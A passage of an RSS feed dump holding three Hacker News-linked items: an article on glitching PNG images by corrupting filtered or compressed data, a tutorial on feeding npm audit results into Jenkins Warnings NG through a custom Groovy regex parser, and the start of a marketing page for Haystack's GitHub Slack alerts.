      PNG is an image format that has a history of development beginning in 1995, and it is still a popular, long living format. Generally, it is known for its features such as lossless compression and  the ability to handle transparent pixels. <br>
      However, we do not look at image formats from a general point of view, but rather think of ways to glitch them. When we look at PNG from the point of view of glitch, what kind of peculiarity does it have?
      </p>
      <h3>Checksum</h3>
      <p>
      We should first look into the checksum system of the CRC32 algorithm. It is used to confirm corrupted images, and when it detects corruption in an image file, normal viewer applications refuse to display it. Therefore, it is impossible to generate glitches using simple methods such as rewriting part of the binary data using text editors or binary editors (you will completely fail). In other words, the PNG format is difficult to glitch. <br>
      We need to create glitches accordingly to the PNG specification in order to avoid this failure. This means that we must rewrite the data after decoding CRC32, re-calculate it and attach it to the edited data.
      </p>

      <h3>State</h3>
      <p>
      Next we want to look at the transcode process of PNG. The chart shown below is a simplified explanation of how PNG encoding flows.
      </p>
      <figure>
        <img src="https://ucnv.github.io/pnglitch/files/states.png" alt="Figure 1)  PNG encoding flow">
        <figcaption>Figure 1) PNG encoding flow</figcaption>
      </figure>


      <p>
      Each of the four states that are shown above can be glitch targets. However, glitching the the first “Raw Data” is the same as glitching BMP, so it technically isn’t a PNG glitch (at the end, it is the same as PNG with the None filter applied. I will explain this in the next section). The final “Formatted PNG” glitch will not work because of the checksum system I mentioned above.<br>
      This means that PNG glitches can be made when the “Filtered Data” or “Compressed Data” is manipulated. I will explain about filters in the following subsection. When “Filtered Data” is glitched, it shows a distinctive effect; patterns that look like flower petals scatter around the image. The difference between the filters become clear when the “Filtered Data” is glitched. On the other hand, “Compressed Data” glitches are flavored by their own compression algorithm, which is Deflate compression. It shows an effect similar to a snow noise image.
      </p>
      <p>
      There are elements else besides the transcoding process that could also influence the appearance of glitches such as transparent pixels and interlaces.
      </p>
      <h3>Five filters</h3>
      <p>
      The factor that characterizes the appearance of glitches the most is the process called filter. The filter converts the uncompressed pixel data of each scanline using a certain algorithm in order to improve the compression efficiency. There are five types of filters that include four algorithms called Sub, Up, Average and Paeth, and also None (which means no filter applied). PNG images are usually compressed after the most suitable filter is applied to each scanline, and therefore all five filters are combined when PNG images are made.<br>
      These five filters usually only contribute to the compression efficiency, so the output result is always the same no matter which filter is applied. However, a clear difference appears in the output result when the filtered data is damaged. It is difficult to recognize the difference of the filters when an image is optimized and has all five filters combined, but the difference becomes obvious when an image is glitched when the same, single filter is applied to each scanline.<br>
      I will show the difference of the effect that each filter has later on, but when we look close into the results, we will understand which filter is causing which part of the beauty of PNG glitches (yes, they are beautiful) to occur.
      </p>
      <p>
        I will show the actual glitch results in the next section.
      </p>

      <h2>Glitching: In practice</h2>

      <figure>
        <a href="https://ucnv.github.io/pnglitch/files/png.png"><img src="https://ucnv.github.io/pnglitch/files/blank.png" data-src="files/png.png" alt="Figure 2) Original PNG image"></a>
        <figcaption>Figure 2) Original PNG image</figcaption>
      </figure>
      <figure>
        <a href="https://ucnv.github.io/pnglitch/files/png-glitch-optimized.png"><img src="https://ucnv.github.io/pnglitch/files/blank.png" data-src="files/png-glitch-optimized.png" alt="Figure 3) Glitched PNG image"></a>
        <figcaption>Figure 3) Glitched PNG image</figcaption>
      </figure>
      <p>
      I have shown two PNG images above: one is an image before it has been glitched, and one is an image that has been glitched.<br>
      This is a Filtered Data glitch, which I explained in the previous section.<br>
      The original PNG has optimized filters applied to each scanline, and all of the five filters have been combined. The glitch reveals how the five filters were balanced when they were the combined.
      </p>
      <h3>Difference between filters</h3>
      <p>
      Lets look into the difference between each filter type.
      </p>

      <figure>
        <a href="https://ucnv.github.io/pnglitch/files/png-glitch-none.png"><img src="https://ucnv.github.io/pnglitch/files/blank.png" data-src="files/png-glitch-none.png" alt="Figure 4) Glitched PNG, filtered with None"></a>
        <figcaption>Figure 4) Glitched PNG, filtered with None</figcaption>
      </figure>

      <figure>
        <img src="https://ucnv.github.io/pnglitch/files/png-glitch-none-detail.png" alt="Figure 5) Magnified view of fig. 4">
        <figcaption>Figure 5) Magnified view of fig. 4</figcaption>
      </figure>
      <p>
      The image above has applied “None (no filter)”, meaning that it is a raw data glitch. Each pixel stands alone in this state and do not have any relationship with the others, so a single re-wrote byte does not have a wide range influence.
      </p>

      <figure>
        <a href="https://ucnv.github.io/pnglitch/files/png-glitch-sub.png"><img src="https://ucnv.github.io/pnglitch/files/blank.png" data-src="files/png-glitch-sub.png" alt="Figure 6) Glitched PNG, filtered with Sub"></a>
        <figcaption>Figure 6) Glitched PNG, filtered with Sub</figcaption>
      </figure>

      <figure>
        <img src="https://ucnv.github.io/pnglitch/files/png-glitch-sub-detail.png" alt="Figure 7) Magnified view of fig. 6">
        <figcaption>Figure 7) Magnified view of fig. 6</figcaption>
      </figure>
      <p>
      This is a glitched image that has the filter “Sub” applied to each scanline. When the Sub algorythm is applied, the target pixel rewrites itself by refering to the pixel that is right next to it. This is why the glitch pattern avalanches towards the right side.
      </p>

      <figure>
        <a href="https://ucnv.github.io/pnglitch/files/png-glitch-up.png"><img src="https://ucnv.github.io/pnglitch/files/blank.png" data-src="files/png-glitch-up.png" alt="Figure 8) Glitched PNG, filtered with Up"></a>
        <figcaption>Figure 8) Glitched PNG, filtered with Up</figcaption>
      </figure>

      <figure>
        <img src="https://ucnv.github.io/pnglitch/files/png-glitch-up-detail.png" alt="Figure 9) Magnified view of fig. 8">
        <figcaption>Figure 9) Magnified view of fig. 8</figcaption>
      </figure>
      <p>
      This is the filter “Up”. This filter is similar to Sub, but its reference direction is the top and bottom.
      </p>

      <figure>
        <a href="https://ucnv.github.io/pnglitch/files/png-glitch-average.png"><img src="https://ucnv.github.io/pnglitch/files/blank.png" data-src="files/png-glitch-average.png" alt="Figure 10) Glitched PNG, filtered with Average"></a>
        <figcaption>Figure 10) Glitched PNG, filtered with Average</figcaption>
      </figure>

      <figure>
        <img src="https://ucnv.github.io/pnglitch/files/png-glitch-average-detail.png" alt="Figure 11) Magnified view of fig. 10">
        <figcaption>Figure 11) Magnified view of fig. 10</figcaption>
      </figure>
      <p>
      The filter “Average” refers to a diagonal direction. It shows a meteor like tail that starts from the damaged pixel. The soft gradation effect is also one of the peculiarities of this filter. The result of a PNG glitch when the Average filter is applied is a glitch that lacks glitchiness, and is also the most delicate portion of PNG glitching.
      </p>

      <figure>
        <a href="https://ucnv.github.io/pnglitch/files/png-glitch-paeth.png"><img src="https://ucnv.github.io/pnglitch/files/blank.png" data-src="files/png-glitch-paeth.png" alt="Figure 12) Glitched PNG, filtered with Paeth"></a>
        <figcaption>Figure 12) Glitched PNG, filtered with Paeth</figcaption>
      </figure>

      <figure>
        <img src="https://ucnv.github.io/pnglitch/files/png-glitch-paeth-detail.png" alt="Figure 13) Magnified view of fig. 12">
        <figcaption>Figure 13) Magnified view of fig. 12</figcaption>
      </figure>
      <p>
      The filter “Paeth” has the most complicated algorithm when compared with the others. It also has the most complicated glitch effect. The glitch will affect a wide range of areas even with the least byte re-writing. The keynote effect of PNG glitch is caused by this filter; the figure shown in the original image is maintained, but is intensely destroyed at the same time.
      </p>

      <h3>Glitch after compression</h3>

      <figure>
        <a href="https://ucnv.github.io/pnglitch/files/png-glitch-compressed.png"><img src="https://ucnv.github.io/pnglitch/files/blank.png" data-src="files/png-glitch-compressed.png" alt="Figure 14) Glitched PNG, after compressed"></a>
        <figcaption>Figure 14) Glitched PNG, after compressed</figcaption>
      </figure>

      <figure>
        <img src="https://ucnv.github.io/pnglitch/files/png-glitch-compressed-detail.png" alt="Figure 15) Magnified view of fig. 14">
        <figcaption>Figure 15) Magnified view of fig. 14</figcaption>
      </figure>
      <p>
      This is a glitch of the state that I referred to as Compressed Data in the previous section. A snowstorm effect appears, and it is difficult to recognize the original figure in the image. It infrequently remains to show effects of the filters. The image is often completely destroyed.
      </p>
　
      <h3>Transparence</h3>
      <p>
      Lets look into what happens when an image that includes transparent pixels is glitched.
      </p>

      <figure>
        <a href="https://ucnv.github.io/pnglitch/files/png-alpha.png"><img src="https://ucnv.github.io/pnglitch/files/blank.png" data-src="files/png-alpha.png" alt="Figure 16) Original PNG image"></a>
        <figcaption>Figure 16) Original PNG image with alpha pixels</figcaption>
      </figure>
      <figure>
        <a href="https://ucnv.github.io/pnglitch/files/png-glitch-alpha.png"><img src="https://ucnv.github.io/pnglitch/files/blank.png" data-src="files/png-glitch-alpha.png" alt="Figure 17) Glitched PNG, with alpha pixels"></a>
        <figcaption>Figure 17) Glitched PNG, with alpha pixels</figcaption>
      </figure>
      <p>
      The transparency comes as an effect. Especially the filter “Average” seems to blend transparent pixels gradually.
      A 100% gathering of transparent pixels is handled in the same way as a solid colored section. You can tell that the filter “Up” is often applied to solid colored sections.<br>
      (There is a possibility that newer general-purpose image formats switch their compression scheme of each part depending on if the image is a solid colored section, or else a complicated image such as photographs. The use of images that include solid colored sections for testing glitches is an effective method. One example is a WebP. )
      </p>

      <h3>Interlace</h3>

      <figure>
        <a href="https://ucnv.github.io/pnglitch/files/png-glitch-interlace.png"><img src="https://ucnv.github.io/pnglitch/files/blank.png" data-src="files/png-glitch-interlace.png" alt="Figure 18) Glitched PNG, with interlace"></a>
        <figcaption>Figure 18) Glitched PNG, with interlace</figcaption>
      </figure>
      <figure>
        <img src="https://ucnv.github.io/pnglitch/files/png-glitch-interlace-detail.png" alt="Figure 19) Magnified view of fig. 18">
        <figcaption>Figure 19) Magnified view of fig. 18</figcaption>
      </figure>
      <p>
        PNG interlaces are divided into seven passes, using the Adam7 algorithm based on 8x8 pixels. We are able to visualy observe that algorithm when an interlaced PNG is glitched. We can also confirm a stitched effect, and that its angle has become narrow towards the Average filter (see appendix B).
      </p>

      <h2>Conclusion</h2>
      <p>
      PNG is a very simple format compared to JPEG or other new image formats. The filter algorithms are like toys, and its compression method is the same as oldschool Zip compression. However, this simple image format shows a surprisingly wide range of glitch variations. We would perhaps only need one example to explain a JPEG glitch, but we need many different types of samples in order to explain what a PNG glitch is.<br>
      PNG was developed as an alternative format of GIF. However, when it comes to glitching, GIF is a format that is too poor to be compared with PNG. PNG has prepared surprisingly rich results that have been concealed by the checksum barrier for a long time.
      </p>


      <hr>
    </section>
    <section>

      <h2><a name="appendix-a"></a>Appendix A: PNGlitch library</h2>
      <p>
      The author released <a href="http://www.jarchive.org/akami/aka018.html">a tiny script for PNG glitch</a> in 2010. Back then, it only removed the CRC32 and added it back again after the internal data was glitched.<br>
      Since then, the author has continued to rewrite the script and make improved versions of it for the purpose of using it in his own work, but he decided to make a library that adopts his know-how in 2014. The Ruby library <a href="https://github.com/ucnv/pnglitch">PNGlitch</a> came out as the result.<br>
      Every glitch image that appears in this article is made by using this …</p></section></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://ucnv.github.io/pnglitch/">https://ucnv.github.io/pnglitch/</a></em></p>]]>
            </description>
            <link>https://ucnv.github.io/pnglitch/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24520201</guid>
            <pubDate>Fri, 18 Sep 2020 18:26:30 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[NPM Audit and Jenkins Warnings Next Generation (Custom Groovy Parser)]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24520186">thread link</a>) | @fazlerocks
<br/>
September 18, 2020 | https://uko.codes/npm-audit-jenkins-warnings-next-generation-custom-groovy-parser | <a href="https://web.archive.org/web/*/https://uko.codes/npm-audit-jenkins-warnings-next-generation-custom-groovy-parser">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="text"><p>At work, I'm developing some projects that use NPM as a package manager. Starting from version 6, NPM will display short audit information at the end of an <code>npm install</code> execution in the following format:</p>
<pre><code><span>found</span> <span>290</span> vulnerabilities (<span>283</span> low, <span>5</span> moderate, <span>2</span> high)
</code></pre><p>You can also get more detailed information. If you run <code>npm audit</code> you will receive explanations for each vulnerability and also some suggestions about how to fix that. For example:</p>
<pre><code># Run  npm <span>update</span> bl 
┌───────────────┬──────────────────────────────────────────────────┐
│ High          │ Remote Memory Exposure                           │
├───────────────┼──────────────────────────────────────────────────┤
│ Package       │ bl                                               │
├───────────────┼──────────────────────────────────────────────────┤
│ Dependency <span>of</span> │ exceljs                                          │
├───────────────┼──────────────────────────────────────────────────┤
│ <span>Path</span>          │ exceljs &gt; archiver &gt; tar-stream &gt; bl             │
├───────────────┼──────────────────────────────────────────────────┤
│ More <span>info</span>     │ https://npmjs.com/advisories/<span>1555</span>                │
└───────────────┴──────────────────────────────────────────────────┘
</code></pre><p>Supposedly, you are using some CI server for your project (and you should use one). Now think about this:</p>
<blockquote>
<p>As your package manager automatically informs you about the vulnerabilities discovered in your dependencies, wouldn't it be awesome to receive this information on par with testing stats and linting reports on your CI server?</p>
</blockquote>
<p>In this blog post, I will walk you through the process of capturing your <code>npm audit</code> output during a Jenkins build and using it for up-to-date information, trend overview, and quality gates.</p>
<h2 id="the-scope">The Scope</h2>
<p>As you may have guessed already, we will talk about Jenkins here. If you are using another CI server, the <em>Understanding the NPM Format</em> section can be still useful for you, but everything else is indeed Jenkins-specific.</p>
<p>First of all, we are going to follow the <strong>declarative pipeline</strong> approach. It's a pity, that Jenkins still won't champion one of the approaches (at the moment Declarative Pipeline, Scripted Pipeline, and UI Config seem to be considered equally important). As the result, many libraries try to document how to use all the approaches, and as they don't have unlimited time, the documentations ends up being scarce. Based on extensive research I decided that Declarative Pipelines are the way to go, and I will stick to this decision throughout this blog.</p>
<p>Secondly, we are going to use the  <strong>Warnings Next Generation</strong>  plugin (a.k.a. <a target="_blank" href="https://plugins.jenkins.io/warnings-ng/">Warnings NG</a>). It seems to be the state of the art for static analysis reports at the moment. And yes, you need to have this plugin installed on your Jenkins server to get things working.</p>
<p>As the Warnings Next Generation plugin does not currently support the npm audit log format, we are going to overcome this issue by creating a <strong>custom groovy parser</strong>. There are other approaches like converting the output to a supported generic format or making a dedicated Jenkins plugin, and I may discuss these in the future. For now, the custom parser looks like the easiest way to get things going and all it requires are some changes to the build configuration.</p>
<p>Finally, I believe that even if your use case does not involve NPM, this blogpost can be useful for understanding how to implement custom groovy parsers for the Warnings GN plugin.</p>
<h2 id="understanding-the-npm-format">Understanding the NPM Format</h2>
<p>As you may imagine, ultimately we will have to parse the <code>npm audit</code> output into something understandable by Warnings NG. Although we are going to discuss the parser setup in the next section, I will spoil you by revealing that the passing uses regular expressions exclusively.</p>
<p>The example output that I shared in the intro contains a table built with ASCI symbols. Such a format is tough to parse with a regex. Luckily there is a flag <code>npm audit --parseable</code> which will write every violation as a single line with values separated by tabs (for the sake of readability I replaced the tabs with aligned spaces in the following snippet):</p>
<pre><code><span>update</span>   bl       <span>high</span>      npm <span>update</span> bl 
<span>install</span>  exceljs  moderate  npm <span>install</span> exceljs@<span>4.1</span><span>.1</span>    <span>Cross</span>-Site Scripting    https://npmjs.com/advisories/<span>733</span>   exceljs                                 Y
<span>update</span>   lodash   <span>low</span>       npm <span>update</span> lodash 
<span>update</span>   lodash   <span>low</span>       npm <span>update</span> lodash 
</code></pre><p>Each line contains the following information in order:</p>
<ol>
<li>Action type required to resolve the issue;</li>
<li>Name of the package with a vulnerability;</li>
<li>Severity of the vulnerability;</li>
<li>Resolution command/suggestion;</li>
<li>Vulnerability category;</li>
<li>Link to the vulnerability details;</li>
<li>Dependency path;</li>
<li>Y, N, or nothing. I don't know what that is :)</li>
</ol>
<p>To write the regex, I've googled a first good regex testing website (<a target="_blank" href="https://regexr.com/">regexr.com</a>), pasted the audit output, and experimented. In the following screenshot you can see from top to bottom:</p>
<ol>
<li>the resulting regex with a highlighted group that I'm investigating;</li>
<li>the example output I used for testing with one highlighted line that I'm investigating;</li>
<li>the breakdown of the match groups in the highlighted line, with one group highlighted which corresponds to the highlighted part of the regex.
<img src="https://cdn.hashnode.com/res/hashnode/image/upload/v1600349954546/rr7FwAR_K.png?auto=format&amp;q=60" alt="Testing npm audit regex at regexr"></li>
</ol>
<p>As you could see, the resulting regex is:</p>
<p><code>\w+\t(\S+)\t(\w+)\t(\S| )+\t((\S| )+)\t(\S+)\t(\S+)</code></p>
<p>Here is a small explanation of important regex matching patterns:</p>
<ul>
<li><code>\t</code> — a tab character;</li>
<li><code>\w</code> — an alphanumerical character;</li>
<li><code>\S</code> — a non-whitespace character;</li>
<li><code>(\S| )</code> — a non-whitespace character or a space;</li>
<li><code>\w+</code> — one or many alphanumerical characters;</li>
<li><code>\S+</code> — one or many non-whitespace characters;</li>
<li><code>(\S| )+</code> — one or many non-whitespace or space characters.</li>
</ul>
<p>You can (and should in this case) use parenthesis to define "capture groups." These are parts of the regex that can be accessed once a match is found. Sometimes you have to use parenthesis (as in <code>(\S| )+</code> to define that <code>+</code> applies to the whole "or" group). There are ways to ignore a certain parenthesis as a match group (so you can avoid pollution by necessary parenthesis) but we are not going to discuss this now.</p>
<p>Also the whole regex can be described as: <code>((\S| )+)\t</code> repeated eight times without the last <code>\t</code>. The whole line is composed of blocks of <em>one or many non-whitespace or space characters</em> followed by a tab. But I tried to be smart and use some simpler constructs where I was sure about the format of some parts.</p>
<h2 id="creating-a-custom-groovy-parser">Creating a Custom Groovy Parser</h2>
<p>At this point, we are going to jump directly into our Jenkins (declarative) pipeline. This assumes that we have a <code>Jenkinsfile</code> that describes a build pipeline composed of several stages. With my approach, all that you have to do is just to add one more stage for auditing. It will look the following way:</p>
<pre><code>stage(<span>'NPM Audit'</span>) {
    steps {
        script {
            // <span>set</span> up the <span>parser</span>
        }
        sh <span>'mkdir -p .tmp/npm'</span>
        sh <span>'npm audit --parseable &gt; .tmp/npm/audit || true'</span>
    }
    post {
        <span>always</span> {
            // <span>record</span> issues
        }
    }
}
</code></pre><p>We will spend the majority of this section to set up the parser, but let's take a quick look at the code that runs the auditing. First of all, don't forget to crate a temp directory where you are going to store the auditing log. Secondly, run the audit with the <code>--parseable</code> flag and write it into a temporary file with a unique name. As you can see, at the end of the command I have <code>|| true</code> which will ensure that the step will not fail. Normally when <code>npm audit</code> finds some vulnerabilities it exits with a non-zero code and thus fails the stage. I prefer to control how the stage fails with the quality gates of Warnings GN, and I will discuss this later. There is another option to specify the <code>--audit-level=critical</code> flag which will fail the step only if there are critical vulnerabilities (and probably you want to fail your build if you have one of those). Never the less, I prefer to handle all the vulnerabilities with Warnings GN. The downside of <code>|| true</code> is that the stage will not fail even if the <code>npm audit</code> command fails to run at all (e.g., if package.json is missing).</p>
<h3 id="defining-the-parser">Defining the Parser</h3>
<p>Based on the documentation, you should set up a parser with the following command:</p>
<pre><code><span><span>def</span> <span>config</span> = <span>io</span>.<span>jenkins</span>.<span>plugins</span>.<span>analysis</span>.<span>warnings</span>.<span>groovy</span>.<span>ParserConfiguration</span>.<span>getInstance</span><span>()</span></span>

<span>if</span>(!config.contains(<span>'npm-audit'</span>)){
    <span><span>def</span> <span>newParser</span> = <span>new</span> <span>io</span>.<span>jenkins</span>.<span>plugins</span>.<span>analysis</span>.<span>warnings</span>.<span>groovy</span>.<span>GroovyParser</span><span>(
        <span>'npm-audit'</span>,
        <span>'NPM Audit Parser'</span>,
        <span>'\w+\t(\S+)\t(\w+)\t(\S| )+\t((\S| )+)\t(\S+)\t(\S+)'</span>,
        <span>'return builder.setFileName(matcher.group(7)).setCategory(matcher.group(4)).setMessage(matcher.group(6)).buildOptional()'</span>,
        <span>"update\tlodash\tlow\tnpm update lodash --depth 9\tPrototype Pollution\thttps://npmjs.com/advisories/1523\telasticsearch&gt;lodash\tN"</span>
    )</span></span>
    config.setParsers(config.getParsers().plus(newParser))
}
</code></pre><p>Let's focus on the actual parser for now. We create a parser by calling the constructor of <code>GroovyParser</code>. The first two parameters are <code>id</code> and <code>name</code>. The <code>id</code> is a technical label used to identify your parser in the future, the <code>name</code> is what you are going to see in the Jenkins UI. Then comes the regex, which is identical to what we discussed in the previous section. The fourth parameter is the script which is going to create Warnings NG issues from the parsed out tokens, and the last one is the example line of what you are trying to parse (for documentation purposes).</p>
<p>Now let's look at the issue-building script in more detail. Essentially, you are using the issue builder API and passing the matched regex groups. To figure out the groups more easily, just look at the regex website again. Here is the list of all the building methods that we used:</p>
<ul>
<li><code>setFileName(matcher.group(7))</code> — this literally sets the filename where the issue was found. Warnings NG will try to search for this file in your source code and will fail in our case (because we have packages and not actual files). Here I pass the package dependency path, so for each vulnerability, you have a clear notion of where it comes from. Another …</li></ul></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://uko.codes/npm-audit-jenkins-warnings-next-generation-custom-groovy-parser">https://uko.codes/npm-audit-jenkins-warnings-next-generation-custom-groovy-parser</a></em></p>]]>
            </description>
            <link>https://uko.codes/npm-audit-jenkins-warnings-next-generation-custom-groovy-parser</link>
            <guid isPermaLink="false">hacker-news-small-sites-24520186</guid>
            <pubDate>Fri, 18 Sep 2020 18:25:39 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: Slack alerts you wish GitHub had]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24519959">thread link</a>) | @doorknobguy
<br/>
September 18, 2020 | https://www.usehaystack.io/alerts | <a href="https://web.archive.org/web/*/https://www.usehaystack.io/alerts">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><main><div><div><div id="w-node-3dd9dc51e7f9-4c0d00e4" data-w-id="beac5ca5-6ed7-dda4-4aee-3dd9dc51e7f9"><p>Remove bottlenecks, optimize process, and work better together<br>with insights from your Github data.</p></div><p><img src="https://uploads-ssl.webflow.com/5ed57622d8ff090eac5b9315/5ef12b7c5ae6d57cd5e0d514_Throughput_with-notification.png" alt=""></p></div></div></main><main id="hero"><div><div><div id="w-node-5623c4fd5ab0-4c0d00e4" data-w-id="0380a09d-ce3b-2f17-c4ca-5623c4fd5ab0"><p>Slack notifications to help your team ship better code, faster.</p></div><div id="w-node-42b75419accf-4c0d00e4" data-w-id="7dc38662-535a-8ef4-513a-42b75419accf"><div data-animation="slide" data-duration="500" data-infinite="1"><div><p><img src="https://uploads-ssl.webflow.com/5ed57622d8ff090eac5b9315/5f629ec18da8fb70f3d0260f_slack-daily-example.png" loading="lazy" srcset="https://uploads-ssl.webflow.com/5ed57622d8ff090eac5b9315/5f629ec18da8fb70f3d0260f_slack-daily-example-p-500.png 500w, https://uploads-ssl.webflow.com/5ed57622d8ff090eac5b9315/5f629ec18da8fb70f3d0260f_slack-daily-example-p-800.png 800w, https://uploads-ssl.webflow.com/5ed57622d8ff090eac5b9315/5f629ec18da8fb70f3d0260f_slack-daily-example-p-1080.png 1080w, https://uploads-ssl.webflow.com/5ed57622d8ff090eac5b9315/5f629ec18da8fb70f3d0260f_slack-daily-example.png 1328w" sizes="(max-width: 479px) 78vw, (max-width: 767px) 81vw, (max-width: 1919px) 82vw, 1326px" alt=""></p><p><img src="https://uploads-ssl.webflow.com/5ed57622d8ff090eac5b9315/5f6283b3d8dc7408ee64b9cb_slack-weekly-example.png" srcset="https://uploads-ssl.webflow.com/5ed57622d8ff090eac5b9315/5f6283b3d8dc7408ee64b9cb_slack-weekly-example-p-500.png 500w, https://uploads-ssl.webflow.com/5ed57622d8ff090eac5b9315/5f6283b3d8dc7408ee64b9cb_slack-weekly-example-p-800.png 800w, https://uploads-ssl.webflow.com/5ed57622d8ff090eac5b9315/5f6283b3d8dc7408ee64b9cb_slack-weekly-example-p-1080.png 1080w, https://uploads-ssl.webflow.com/5ed57622d8ff090eac5b9315/5f6283b3d8dc7408ee64b9cb_slack-weekly-example.png 1328w" sizes="(max-width: 479px) 78vw, (max-width: 767px) 81vw, (max-width: 1919px) 82vw, 1326px" alt=""></p></div></div></div></div></div></main><section id="Features"><div><div id="w-node-0bb393705a91-4c0d00e4"><p>Spot bottlenecks, burnout, and 10x your review process.</p></div></div><header><div id="Feature-1"><div id="w-node-b744e92c040c-4c0d00e4"><p>REAL-TIME ALERTS</p><h2>Spot bottlenecks</h2><p>Resolve issues quickly and unblock your team. Spur meaningful conversations during the sprint instead of in the next retro.<br>‍<br></p></div><p><img src="https://uploads-ssl.webflow.com/5ed57622d8ff090eac5b9315/5f6297885edb9d6108dd6a71_spot-bottlenecks-alert.png" width="607" srcset="https://uploads-ssl.webflow.com/5ed57622d8ff090eac5b9315/5f6297885edb9d6108dd6a71_spot-bottlenecks-alert-p-500.png 500w, https://uploads-ssl.webflow.com/5ed57622d8ff090eac5b9315/5f6297885edb9d6108dd6a71_spot-bottlenecks-alert-p-800.png 800w, https://uploads-ssl.webflow.com/5ed57622d8ff090eac5b9315/5f6297885edb9d6108dd6a71_spot-bottlenecks-alert.png 928w" sizes="(max-width: 767px) 100vw, (max-width: 1919px) 77vw, 1248px" id="w-node-b744e92c0422-4c0d00e4" alt=""></p></div></header><header><div id="Feature-2"><p><img src="https://uploads-ssl.webflow.com/5ed57622d8ff090eac5b9315/5f63c4c22f203e475cd9fd88_slack-message-image.png" width="607" srcset="https://uploads-ssl.webflow.com/5ed57622d8ff090eac5b9315/5f63c4c22f203e475cd9fd88_slack-message-image-p-500.png 500w, https://uploads-ssl.webflow.com/5ed57622d8ff090eac5b9315/5f63c4c22f203e475cd9fd88_slack-message-image-p-800.png 800w, https://uploads-ssl.webflow.com/5ed57622d8ff090eac5b9315/5f63c4c22f203e475cd9fd88_slack-message-image.png 928w" sizes="(max-width: 767px) 100vw, (max-width: 991px) 58vw, (max-width: 1919px) 77vw, 1248px" id="w-node-f6cddb11c0c8-4c0d00e4" alt=""></p><div id="w-node-f6cddb11c0b1-4c0d00e4"><p>HELPFUL NUDGES</p><h2>Encourage Best Practices</h2><div><p>Track process improvements and act quickly with real-time updates. No more guessing if your changes are working.</p></div></div></div></header><header><div id="Feature-3"><div id="w-node-e44b8362bb6c-4c0d00e4"><p>POWERFUL REMINDERS</p><h2>Stop Getting Stuck<br></h2><h2>'In Review'<br></h2><p>Keep your review process flowing with helpful alerts. Set reminders and notifications for when the team gets stuck.<a href="https://services.github.com/"><br></a><br></p></div><p><img src="https://uploads-ssl.webflow.com/5ed57622d8ff090eac5b9315/5f6294e88a4808dd5a0833b2_improve-review-alerts.png" width="607" srcset="https://uploads-ssl.webflow.com/5ed57622d8ff090eac5b9315/5f6294e88a4808dd5a0833b2_improve-review-alerts-p-500.png 500w, https://uploads-ssl.webflow.com/5ed57622d8ff090eac5b9315/5f6294e88a4808dd5a0833b2_improve-review-alerts-p-800.png 800w, https://uploads-ssl.webflow.com/5ed57622d8ff090eac5b9315/5f6294e88a4808dd5a0833b2_improve-review-alerts.png 928w" sizes="(max-width: 767px) 100vw, (max-width: 1919px) 77vw, 1248px" id="w-node-e44b8362bb83-4c0d00e4" alt=""></p></div></header></section><div><div data-w-id="1913e8fc-27d5-f2b4-033e-a7ad21644d4e"><p>Integrations</p><h2>Integrated with tools you already know and love.</h2></div></div><section id="Testimonials"><div><div><div><div data-w-id="92185803-4d8b-15a4-9568-5a8781084a54"><p>Our Clients</p><h2>Hear what our lovely clients say!<br></h2><p>Don’t take our word for it, take theirs.</p><p><a href="https://www.usehaystack.io/contact-us">Start Free Trial</a></p></div></div><div><div data-animation="slide" data-duration="500" data-infinite="1" data-w-id="92185803-4d8b-15a4-9568-5a8781084a5d"><div><div><div><div role="list"><div role="listitem"><div><p>“I've tried just about every one of these tools and ended up choosing Haystack. Easy to use, no fluff and I love reading insights with my morning coffee”</p><div><p><img width="61" id="w-node-5a8781084a64-4c0d00e4" src="https://uploads-ssl.webflow.com/5ed57622ee14fb96d022d544/5f5ab21f5a5c1d05fa46cdee_jean-photo.jpeg" alt=""></p><div><p>Jean-Vicente De Carvalho</p><p>CTO at Lytehouse</p></div></div></div></div></div></div></div><div><div><div role="list"><div role="listitem"><div><p>“At first I was pretty skeptical these alerts would actually work. Since then we've found issues we never knew we had, resolved issues that we typically miss and the team has never felt so productive.”</p><div><p><img width="61" id="w-node-f94162db8587-4c0d00e4" src="https://uploads-ssl.webflow.com/5ed57622ee14fb96d022d544/5f5ab258d22639f82030c1da_joel-photo.jpeg" alt=""></p><div><p>Joel Spitalnik</p><p>VP of Engineering at IRIS.TV</p></div></div></div></div></div></div></div><div><div><div role="list"><div role="listitem"><div><p>"This is the product you thought of while reading Accelerate. We can experiment and make more changes - while knowing we're headed in the right direction"</p><div><p><img width="61" id="w-node-3f69e9154639-4c0d00e4" src="https://uploads-ssl.webflow.com/5ed57622ee14fb96d022d544/5f5abae65a5c1d706a46de5f_gady-pitaru.jpeg" alt=""></p><div><p>Gady Pitaru</p><p>CTO at Badger Maps</p></div></div></div></div></div></div></div><div><div><div role="list"><div role="listitem"><div><p>"Simple. Easy to use and lets you to dig in if you need to. No fluff metrics or 'big brother' reporting."</p><div><p><img width="61" id="w-node-94587b18d5aa-4c0d00e4" src="https://uploads-ssl.webflow.com/5ed57622ee14fb96d022d544/5f5ac46f360f449966fe3cb4_robert-hucik.jpeg" alt=""></p><div><p>Robert Hucik</p><p>SVP, Cloud Solutions at ForgeRock</p></div></div></div></div></div></div></div></div><p><img src="https://uploads-ssl.webflow.com/5ed57622d8ff090eac5b9315/5ed57622ee14fb89f722d550_arrow-left-saasy-template.svg" alt=""></p><p><img src="https://uploads-ssl.webflow.com/5ed57622d8ff090eac5b9315/5ed57622ee14fb7d7822d551_arrow-right-saasy-template.svg" alt=""></p></div><p><img src="https://uploads-ssl.webflow.com/5ed57622d8ff090eac5b9315/5ed57622ee14fbe09f22d536_background-pattern-bullets-saasy-template.svg" data-w-id="92185803-4d8b-15a4-9568-5a8781084a7b" alt=""></p></div></div></div></section><section><div><div><div data-w-id="c35d4237-391d-b7ac-d37d-be1394d7ce4a"><p>Mobile App</p><h2>Browse your analytics &amp; reports on the go!</h2><p>Browse all analytics reports, user profiles, and much more in our mobile app. It’s free, and full-feature packaged to help you on the go.</p><div><p><a 